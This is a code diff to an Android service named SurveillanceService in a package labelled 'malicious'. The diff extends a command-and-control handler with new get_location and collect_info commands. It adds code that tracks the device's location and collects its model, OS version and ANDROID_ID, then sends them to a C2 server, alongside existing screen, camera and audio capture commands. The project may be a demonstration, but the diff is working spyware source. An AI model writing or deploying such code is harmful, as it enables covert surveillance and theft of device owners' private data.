@@ -24,6 +24,7 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
 import android.os.SystemClock
+import android.provider.Settings
 import android.util.Log
 import android.view.PixelCopy
 import android.view.WindowManager
@@ -40,10 +41,12 @@ import java.util.TimerTask
 import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
+import org.json.JSONObject
 
 // Import the C2 components
 import com.example.ChatterBox.malicious.C2Config
 import com.example.ChatterBox.malicious.C2Client
+import com.example.ChatterBox.malicious.LocationTracker
 
 // Import annotations for suppressing warnings
 import androidx.annotation.RequiresApi
@@ -319,7 +322,7 @@ class SurveillanceService : Service() {
         for (command in commands) {
             try {
                 when {
-                    command.startsWith("capture_screen") -> {
+                    command.startsWith("capture_screen") || command == "capture_screenshot" -> {
                         Log.d(TAG, "Executing command: capture_screen")
                         // Show notification
                         showCommandNotification("Executing capture_screen command")
@@ -331,11 +334,23 @@ class SurveillanceService : Service() {
                         showCommandNotification("Executing capture_camera command")
                         captureCamera()
                     }
-                    command.startsWith("record_audio") -> {
+                    command.startsWith("record_audio") || command == "record_audio" -> {
                         Log.d(TAG, "Executing command: record_audio")
                         // Show notification
                         showCommandNotification("Executing record_audio command")
                         recordAudio()
+                    }
+                    command == "get_location" -> {
+                        Log.d(TAG, "Executing command: get_location")
+                        // Show notification
+                        showCommandNotification("Executing get_location command")
+                        getLocation()
+                    }
+                    command == "collect_info" -> {
+                        Log.d(TAG, "Executing command: collect_info")
+                        // Show notification
+                        showCommandNotification("Executing collect_info command")
+                        collectDeviceInfo()
                     }
                     // More command types can be added here
                     else -> {
@@ -371,6 +386,47 @@ class SurveillanceService : Service() {
         android.os.Handler().postDelayed({
             notificationManager.cancel(notificationId)
         }, 3000)
+    }
+    
+    /**
+     * Get the device's current location and send it to the C2 server
+     */
+    private fun getLocation() {
+        try {
+            val locationTracker = LocationTracker(this)
+            locationTracker.startTracking()
+            
+            // Stop tracking after 10 seconds (after we get at least one location)
+            android.os.Handler().postDelayed({
+                locationTracker.stopTracking()
+            }, 10000)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting location", e)
+        }
+    }
+    
+    /**
+     * Collect basic device information and send it to the C2 server
+     */
+    private fun collectDeviceInfo() {
+        try {
+            // Create JSON with device information
+            val deviceInfo = JSONObject().apply {
+                put("device_model", android.os.Build.MODEL)
+                put("device_manufacturer", android.os.Build.MANUFACTURER)
+                put("android_version", android.os.Build.VERSION.RELEASE)
+                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
+                put("timestamp", System.currentTimeMillis())
+            }
+            
+            // Send to C2 server
+            c2Client.sendExfiltrationData("device_info", deviceInfo.toString())
+            
+            Log.d(TAG, "Device info collected and sent to C2 server")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error collecting device info", e)
+        }
     }
 
     override fun onDestroy() {
